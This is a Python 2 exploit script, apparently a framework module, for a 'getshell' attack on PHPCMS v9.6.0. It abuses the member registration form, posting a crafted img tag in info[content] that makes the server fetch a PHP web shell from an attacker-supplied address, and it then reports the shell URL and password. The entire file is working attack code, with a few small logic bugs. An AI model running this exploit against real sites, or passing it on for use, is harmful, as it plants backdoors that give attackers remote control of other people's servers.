import requests
import re

# PHPCMS v9 Getshell
# Referer: https://blog.csdn.net/m0_37438418/article/details/80956970

sess = requests.session()

class exploit():
    def __init__(self):
        self.param = {'url': None, 'password': None, 'shelladdr': None, 'time': None, 'timeout': 10}
        pass

    def exploit(self):
        sess = requests.session()
        try:
            resp = sess.get('http://%s/index.php?m=member&c=index&a=register&siteid=1' %(str(self.param['url'])),timeout=int(self.param['timeout']))
            if resp.status_code == 200:
                print '[+] Register function is up.'
            resp = sess.post('%s/index.php?m=member&c=index&a=register&siteid=1' %(str(self.param['url'])),
                      'siteid=1&modelid=11&username=test&password=test&email=test&info[content]=<img src=%s?.php#.jpg>&dosubmit=1&protocol=' %(str(self.param['shelladdr'])),
                             timeout=int(self.param['timeout']))
            if resp.text.find('MySQL Error'):
                print '[+] Exploit completed.'
                print '[*] Checking backdoor status.'
            else:
                print '[!] Error sending exploit.'
                return
            shelladdr = re.findall('http://.*?php',resp.text)
            if sess.get(shelladdr,timeout=int(self.param['timeout'])).status_code == 200:
                print '[+] Shell spawned success, URL: %s, Password: %s' %(shelladdr,self.param['password'])
            else:
                print '[!] Shell spawn failed.'
        except Exception,e:
            print '[!] Error: %s' %str(e)
            return 1
        return 0

    def info(self):
        print '''
        PHPCMS v9.6.0 Add user page getshell
        Parameters:
            url: Target addr
            password: Shell password
            timeout: Max connection time
            shelladdr: Shell address
        Referer: 
            https://blog.csdn.net/m0_37438418/article/details/80956970
            https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/phpcms/phpcms9.6.0-getshell.py
        '''
        pass